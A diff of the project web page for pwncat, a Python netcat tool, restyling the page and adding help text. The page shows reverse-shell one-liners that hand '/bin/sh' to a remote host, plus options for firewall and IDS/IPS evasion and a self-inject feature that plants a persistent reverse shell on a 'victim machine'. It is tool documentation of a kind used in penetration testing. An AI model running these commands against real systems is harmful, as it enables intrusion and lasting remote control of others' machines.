@@ -2,24 +2,74 @@
 <html lang="en">
 <head>
 	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="description" content="Enhanced netcat implementation in Python.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="author" content="cytopia">
+	<meta name="description" content="Pwncat - Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python">
+	<meta name="keywords" content="pwncat, netcat, reverse shell, bind shell, unbreakable reverse shell, UDP reverse shell, pwncat scripting engine, IDS evasion, IPS evasion, Firewall evasion">
 	<title>pwncat</title>
-	<style>
-	body {background-color: #000; color:#006400;font-size: 15px; cursor: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/9632/happy.png"), auto;}
-	a:link, a:visited, a:active {color: #006400;}
-	a:hover {color: #00FF00;}
-	h1 {font-size:144px; margin:0; padding:0}
-	h1:hover {color: #00FF00;}
-	.hi:hover {color: #00FF00;}
-	ul {margin-top:50px;}
-	li {list-style-type: none; margin:15px; font-size:46px;}
-	#wrapper {overflow: hidden;display: flex;}
-	#left {width: 20%; vertical-align;margin-right:50px}
-	#rght {vertical-align; padding-left:50px;}
-	</style>
-	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mini.css/3.0.1/mini-default.min.css">
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60914146-3"></script>
+	<style>
+		body, pre, code, header, div, blockquote {
+			background-color:#000 !important;
+			color:#006400;
+			border:0px !important;
+		}
+		h1 {
+			margin: 5px;
+			padding: 0;
+		}
+		marquee.headline {
+		}
+		marquee.headline.outter {
+			height: 110px;
+			margin:0px;
+		}
+		marquee.headline.inner {
+			width: 260px;
+		}
+		html, body {
+			font-size: 1.1rem;
+		}
+		@media only screen and (max-width: 1200px) {
+			html, body {
+				font-size: 1.0rem;
+			}
+		}
+		@media only screen and (max-width: 880px) {
+			html, body {
+				font-size: 0.9rem;
+			}
+		}
+		@media only screen and (max-width: 800px) {
+			html, body {
+				font-size: 0.8rem;
+			}
+		}
+		@media only screen and (max-width: 600px) {
+			html, body {
+				font-size: 0.7rem;
+			}
+		}
+		@media only screen and (max-width: 525px) {
+			html, body {
+				font-size: 0.6rem;
+			}
+		}
+		@media only screen and (max-width: 460px) {
+			html, body {
+				font-size: 0.5rem;
+			}
+		}
+		a:link, a:visited, a:active {
+			color: #006400;
+		}
+		.hover, h1:hover, a:hover, code:hover, pre:hover {
+			color: #00FF00 !important;
+			cursor: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/9632/happy.png"), auto;
+		}
+		li {list-style-type: none;}
+	</style>
 	<script>
 		window.dataLayer = window.dataLayer || [];
 		function gtag(){dataLayer.push(arguments);}
@@ -28,28 +78,43 @@
 	</script>
 </head>
 <body>
-	<!-- I really suck at HTML, would be my please if you PR-clean this and make it even more oldschool ;-) -->
-	<marquee behavior="alternate">
-		<code class="hi">pwncat -n -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code class="hi">pwncat -n --recon 0 --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code class="hi">pwncat -n --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code> ##########
-		<code class="hi">pwncat -n --safe-word 'all your base are belong to us' --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code>
-	</marquee>
-	<div id="wrapper">
-		<div id="left">
-			<ul>
-				<li><a href="https://github.com/cytopia/pwncat">github</a></li>
-				<li><a href="https://cytopia.github.io/pwncat/pwncat.api.html">api</a></li>
-				<li><a href="https://cytopia.github.io/pwncat/pwncat.man.html">man</a></li>
-			</ul>
-		</div>
-		<div id="right">
-			<marquee direction="down" width="455" height="200" behavior="alternate">
-			  <marquee behavior="alternate">
-				<h1>pwncat</h1>
-			  </marquee>
-			</marquee>
-			<p><pre><code class="hi">
+	<header class="sticky">
+		<marquee behavior="alternate">
+			<small>
+				<code class="hi">pwncat -n -e /bin/sh {home-addr} {home-port}</code> ##########
+				<code class="hi">pwncat -n --recon -1 --recon-robin 4000-4100 -e /bin/sh {home-addr} {home-port}</code> ##########
+				<code class="hi">pwncat -n --udp --udp-ping-intvl 30 -e /bin/sh {home-addr} {home-port}</code> ##########
+				<code class="hi">pwncat -n --safe-word 'all your base are belong to us' --udp --udp-ping-intvl 2 -e /bin/sh {home-addr} {home-port}</code> ##########
+				<code class="hi">pwncat -l -vvv 4444 2&gt; comm.txt</code> ##########
+				<code class="hi">pwncat -u --reconn -1 -R 56.0.0.1:4444 10.0.0.1 3306</code>
+			</small>
+		</marquee>
+	</header>
+	<!-- I really suck at HTML. Feel free to PR-fix this :) -->
+	<div class="container">
+		<div class="row">
+			<label for="drawer-control" class="drawer-toggle"></label>
+			<input type="checkbox" id="drawer-control" class="drawer"/>
+			<div class="cols-sm-12 col-md-2">
+				<label for="drawer-control" class="drawer-close"></label>
+				<ul>
+					<li><span class="icon-home secondary"></span> <a href="https://github.com/cytopia/pwncat">github</a></li>
+					<li><span class="icon-settings secondary"></span> <a href="https://github.com/cytopia/pwncat/tree/master/pse">pse</a></li>
+					<li><span class="icon-edit secondary"></span> <a href="https://github.com/cytopia/pwncat/blob/master/bin/pwncat">src</a></li>
+					<li><span class="icon-help secondary"></span> <a href="https://cytopia.github.io/pwncat/pwncat.api.html">api</a></li>
+					<li><span class="icon-info secondary"></span> <a href="https://cytopia.github.io/pwncat/pwncat.man.html">man</a></li>
+				</ul>
+			</div>
+			<div class="col-sm-12 col-md-10">
+				<marquee class="headline outter" direction="down" class="headline" behavior="alternate">
+				  <marquee class="headline inner" direction="left" behavior="alternate">
+					<h1 style="font-size:72px;">pwncat</h1>
+				  </marquee>
+				</marquee>
+				<blockquote cite="github.com/cytopia/pwncat">
+					Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (<a href="https://github.com/cytopia/pwncat/tree/master/pse">PSE</a>).
+				</blockquote>
+				<pre>
 usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] [-e cmd] -l [hostname] port
        pwncat [-Cnuv] -z hostname port
@@ -57,9 +122,8 @@ usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] -R addr:port hostname port
        pwncat -V, --version
        pwncat -h, --help
-</code></pre>
-<pre class="hi"><code>
-
+</pre>
+<pre class="hi">
 Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
 connect, zero-i/o, listen and forward modes and techniques to detect and evade
 firewalls and intrusion detection/prevention systems.
@@ -68,15 +132,13 @@ If no mode arguments are specified, pwncat will run in connect mode and act as
 a client to connect to a remote endpoint. If the connection to the remote
 endoint is lost, pwncat will quit. See advanced options for how to automatically
 reconnect.
-</code></pre>
-
-<pre class="hi"><code>
+</pre>
+<pre class="hi">
 positional arguments:
   hostname              Address to listen, forward or connect to
   port                  Port to listen, forward or connect to
-
-</code></pre>
-<pre class="hi"><code>
+</pre>
+<pre class="hi">
 mode arguments:
   -l, --listen          [Listen mode]:
                         Start a server and listen for incoming connections.
@@ -110,9 +172,8 @@ mode arguments:
                         The connection to your listening server is given by
                         -R/--remote addr:port and the connection to the
                         target machine via the positional arguments.
-
-</code></pre>
-<pre class="hi"><code>
+</pre>
+<pre class="hi">
 optional arguments:
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
   -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
@@ -131,9 +192,23 @@ optional arguments:
                         goes to a terminal. If it is piped into a file, color
                         will automatically be disabled. This mode also disables
                         color on Windows by default. (default: auto)
-
-</code></pre>
-<pre class="hi"><code>
+</pre>
+<pre class="hi">
+command & control arguments:
+  --self-inject cmd:host:port
+                        Listen mode (TCP only):
+                        If you are about to inject a reverse shell onto the
+                        victim machine (via php, bash, nc, ncat or similar),
+                        start your listening server with this argument.
+                        This will then (as soon as the reverse shell connects)
+                        automatically deploy and background-run an unbreakable
+                        pwncat reverse shell onto the victim machine which then
+                        also connects back to you with specified arguments.
+                        Example: '--self-inject /bin/bash:10.0.0.1:4444'
+                        Note: this is currently an experimental feature and does
+                        not work on Windows remote hosts yet.
+</pre>
+<pre class="hi">
 advanced arguments:
   --script-send file    All modes (TCP and UDP):
                         A Python scripting engine to define your own custom
@@ -269,14 +344,13 @@ advanced arguments:
                         be ignored and it won't listen again or reconnect to you.
                         Use a very unique string to not have it shut down
                         accidentally by other input.
-
-</code></pre>
-<pre class="hi"><code>
+</pre>
+<pre class="hi">
 misc arguments:
   -h, --help            Show this help message and exit
   -V, --version         Show version information and exit
-</code></pre>
-			</p>
+</pre>
+			</div>
 		</div>
 	</div>
 </body>
